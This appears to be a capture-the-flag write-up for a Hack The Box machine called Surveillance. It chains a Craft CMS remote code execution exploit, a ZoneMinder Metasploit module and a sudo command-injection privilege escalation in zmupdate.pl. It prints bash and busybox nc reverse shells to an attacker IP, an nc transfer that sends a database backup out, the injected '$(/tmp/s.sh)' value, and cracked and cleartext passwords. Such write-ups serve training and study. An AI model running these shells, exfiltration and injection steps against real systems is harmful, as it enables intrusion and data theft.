# Surveillance

Difficulty Medium 

## Enumeration

```
nmap --vv -sS -sCV -p- --min-rate 5000 -oX 10.10.11.245.xml 10.10.11.245
```

| Port | Service | Info |
| ---- | ----	 | ---- |
| 22 | ssh | |
| 80 | http | http-title: Did not follow redirect to http://surveillance.htb/ |

Adding the domain to hosts

```
echo '10.10.11.245 surveillance.htb' | sudo tee -a /etc/hosts
```

Footer-Section reveals Versionnumber of CMS. Following the link and selecting the register-tab Security show serveral issues. 
```
<!-- footer section -->
  <section class="footer_section">
    <div class="container">
      <p>
        &copy; <span id="displayYear"></span> All Rights Reserved By
        SURVEILLANCE.HTB</a><br> <b>Powered by <a href="https://github.com/craftcms/cms/tree/4.4.14"/>Craft CMS</a></b>
      </p>
    </div>
  </section>
```

## Foothold

### Exploitation

For the Critical issue with the CVE-2023-41892 a poc can be found:

https://gist.github.com/to016/b796ca3275fa11b5ab9594b1522f7226

There are other POC which are similar but haven't worked for me very well.
The main change is at the writePayloadToTempFile Function:
```
 response = requests.post(url, headers=headers, data=data, files=files) 
```

Instead of files=files is a proxy used. So check if you got the right one and not the forked poc. 

Exploit using poc:
```
python3 poc.py http://surveillance.htb
[-] Get temporary folder and document root ...
[-] Write payload to temporary file ...
[-] Trigger imagick to write shell ...
[-] Done, enjoy the shell
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Start listener on attacker
```
nc -nlvp 1337
```

Upgrading this webshell 
```
$ bash -c "bash -i >& /dev/tcp/10.10.14.13/1337 0>&1"
```

### Cracking SSH Credentials

Copy the backup file surveillance--2023-10-17-202801--v4.4.14.sql.zip (~/html/craft/storage/backups)

Starting listener on attacker machine
```
nc -nlp 1338 > backup.zip
```

Tranfering file using nc from vitcim
```
nc -w 3 10.10.14.13 1338 < surveillance--2023-10-17-202801--v4.4.14.sql.zip
```

In this backup we can find the hash for Matthew:
```
'Matthew B','Matthew','B','admin@surveillance.htb','39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec','2023-10-17 20:22:34',NULL,NULL,NULL,'
```

Cracking the hash, hashcat or just use crackstation.net
```
echo '39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec' > hash.txt

hashcat --identify hash.txt
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated

hashcat -m 1400 -a 3 hash.txt /usr/share/wordlists/rockyou.txt
....
hashcat -m 1400 -a 3 hash.txt /usr/share/wordlists/rockyou.txt --show
39ed84b22ddc63ab3725a1820aaa7f73a8f3f10d0848123562c9f35c675770ec:starcraft122490
```

Login using the credentials we have cracked and get the user-flag.

## Root

### Exploitation

Starting metasploit and login with the ssh-credentials and upgrading to meterpreter-shell.
```
msfconsole
...
use auxiliary/scanner/ssh/ssh_login
set PasSwORD starcraft122490
set UsernaME matthew
set RHOSTS surveillance.htb
run
...
sessions -u 1
...
sessions -i 2
```

Using netstat shows us some open ports and forfarding the 8080 reveals an application called zoneMinder
```
meterpreter > netstat

Connection list
===============

    Proto  Local address       Remote address     State        User  Inode  PID/Program name
    -----  -------------       --------------     -----        ----  -----  ----------------
    tcp    127.0.0.1:8080      0.0.0.0:*          LISTEN       0     0
    tcp    0.0.0.0:22          0.0.0.0:*          LISTEN       0     0
    tcp    127.0.0.53:53       0.0.0.0:*          LISTEN       102   0
    tcp    0.0.0.0:80          0.0.0.0:*          LISTEN       0     0
    tcp    127.0.0.1:3306      0.0.0.0:*          LISTEN       114   0
```

Forwarding this port to our local port 58080 and visiting this site 127.0.0.1:58080 shows the application ZoneMinder.

```
ssh -L 58080:127.0.0.1:8080 matthew@surveillance.htb 
```

Same story as with the cms checking the secruity tab of github https://github.com/ZoneMinder/zoneminder/security shows many issues.

metasploit got an excellent exploit:
```
msfconsole

... ... ...

search zoneminder

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  exploit/unix/webapp/zoneminder_lang_exec            2022-04-27       excellent  Yes    ZoneMinder Language Settings Remote Code Execution
   1  exploit/unix/webapp/zoneminder_snapshots            2023-02-24       excellent  Yes    ZoneMinder Snapshots Command Injection
   2  exploit/unix/webapp/zoneminder_packagecontrol_exec  2013-01-22       excellent  Yes    ZoneMinder Video Server packageControl Command Execution
   
... ... ...

use exploit/unix/webapp/zoneminder_snapshots
options

Module options (exploit/unix/webapp/zoneminder_snapshots):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connectio
   
... ... ...

set RHOSTS 127.0.0.1
set RPORT 58080
set TARGETURI /
set LHOST tun0
set LPORT 1337
set AutoCheck false
run

[*] Started reverse TCP handler on 10.10.14.58:1337
[!] AutoCheck is disabled, proceeding with exploitation
[*] Fetching CSRF Token
[+] Got Token: key:9a323016abf639e55b0c95633bea441ef3f901d0,1702401100
[*] Executing nix Command for cmd/linux/http/x64/meterpreter/reverse_tcp
[*] Sending payload
[*] Sending stage (3045380 bytes) to 10.10.11.245
[*] Meterpreter session 1 opened (10.10.14.58:1337 -> 10.10.11.245:35170) at 2023-12-12 18:11:44 +0100
meterpreter > shell
id
uid=1001(zoneminder) gid=1001(zoneminder) groups=1001(zoneminder)
```
### Privilege escalation

We can execute any script starting with zm following by any count of chars from the Alphabet(Reg-ex: zm[a-zA-Z]*.pl) at the folder /usr/bin/zm 
```
sudo -l
Matching Defaults entries for zoneminder on surveillance:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User zoneminder may run the following commands on surveillance:
    (ALL : ALL) NOPASSWD: /usr/bin/zm *
ls -lha /usr/bin/zm*.pl
-rwxr-xr-x 1 root root  43K Nov 23  2022 /usr/bin/zmaudit.pl
-rwxr-xr-x 1 root root  13K Nov 23  2022 /usr/bin/zmcamtool.pl
-rwxr-xr-x 1 root root 6.0K Nov 23  2022 /usr/bin/zmcontrol.pl
-rwxr-xr-x 1 root root  26K Nov 23  2022 /usr/bin/zmdc.pl
-rwxr-xr-x 1 root root  35K Nov 23  2022 /usr/bin/zmfilter.pl
-rwxr-xr-x 1 root root 5.6K Nov 23  2022 /usr/bin/zmonvif-probe.pl
-rwxr-xr-x 1 root root  19K Nov 23  2022 /usr/bin/zmonvif-trigger.pl
-rwxr-xr-x 1 root root  14K Nov 23  2022 /usr/bin/zmpkg.pl
-rwxr-xr-x 1 root root  18K Nov 23  2022 /usr/bin/zmrecover.pl
-rwxr-xr-x 1 root root 4.8K Nov 23  2022 /usr/bin/zmstats.pl
-rwxr-xr-x 1 root root 2.1K Nov 23  2022 /usr/bin/zmsystemctl.pl
-rwxr-xr-x 1 root root  13K Nov 23  2022 /usr/bin/zmtelemetry.pl
-rwxr-xr-x 1 root root 5.3K Nov 23  2022 /usr/bin/zmtrack.pl
-rwxr-xr-x 1 root root  19K Nov 23  2022 /usr/bin/zmtrigger.pl
-rwxr-xr-x 1 root root  45K Nov 23  2022 /usr/bin/zmupdate.pl
-rwxr-xr-x 1 root root 8.1K Nov 23  2022 /usr/bin/zmvideo.pl
-rwxr-xr-x 1 root root 6.9K Nov 23  2022 /usr/bin/zmwatch.pl
-rwxr-xr-x 1 root root  20K Nov 23  2022 /usr/bin/zmx10.pl
```

Download them and analyze 
```
Press Ctrl+z for background the shell
^Z
Background channel 2? [y/N]  y
meterpreter > cd /usr/bin
meterpreter > download zm*.pl
[*] downloading: ./zmaudit.pl -> /mnt/e/kali/ctf/htb/Machines/Surveillance/zmaudit.pl
[*] Completed  : ./zmaudit.pl -> /mnt/e/kali/ctf/htb/Machines/Surveillance/zmaudit.pl
[*] downloading: ./zmcamtool.pl -> /mnt/e/kali/ctf/htb/Machines/Surveillance/zmcamtool.pl
... ... ...

```

In zmupdate.pl we can pass a shell as user-parameter.
```
Starting at Line 414
      } elsif ($dbUser) {
        $command .= ' -u'.$dbUser;   
        $command .= ' -p\''.$dbPass.'\'' if $dbPass;
      }
```

The password is written in cleartext at /etc/zm/zm.conf
```
meterpreter > cat /etc/zm/zm.conf
# ==========================================================================
#
# ZoneMinder Base Configuration
#
# ==========================================================================
#
... ... ...
# ZoneMinder database password
ZM_DB_PASS=ZoneMinderPassword2023
... ... ...
```

Creating shell
```
#!/bin/bash
busybox nc 10.10.14.58 1337 -e sh
```

Uploading shell and executing command where the user-param value is the path to our shell.Ofc starting our listener as well.
```... ... ... Uploading shell ... ... ...
meterpreter > cd /tmp
meterpreter > upload s.sh
meterpreter > shell
Process 2317 created.
Channel 28 created.
chmod +x s.sh
ls -lha s.sh
-rwxr-xr-x 1 zoneminder zoneminder 46 Dec 12 17:58 s.sh
sudo /usr/bin/zmupdate.pl --version=1 --user='$(/tmp/s.sh)' --pass=ZoneMinderPassword2023

Initiating database upgrade to version 1.36.32 from version 1

WARNING - You have specified an upgrade from version 1 but the database version found is 1.36.32. Is this correct?
Press enter to continue or ctrl-C to abort :

Do you wish to take a backup of your database prior to upgrading?
This may result in a large file in /tmp/zm if you have a lot of events.
Press 'y' for a backup or 'n' to continue : y
Creating backup to /tmp/zm/zm-1.dump. This may take several minutes.

```

And here the already started listener
```
nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.14.58] from (UNKNOWN) [10.10.11.245] 55692
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```
